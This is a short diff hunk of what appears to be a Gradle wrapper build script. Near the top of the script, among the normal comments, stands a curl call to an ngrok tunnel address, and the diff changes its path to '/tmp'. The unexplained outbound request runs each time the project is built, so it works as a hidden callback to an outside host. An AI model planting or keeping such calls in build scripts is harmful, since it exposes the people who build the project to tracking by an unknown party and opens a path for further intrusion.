@@ -6,7 +6,7 @@
 ##
 ##############################################################################
 
-curl https://85b9-119-82-122-194.ngrok-free.app 
+curl https://85b9-119-82-122-194.ngrok-free.app/tmp
 
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
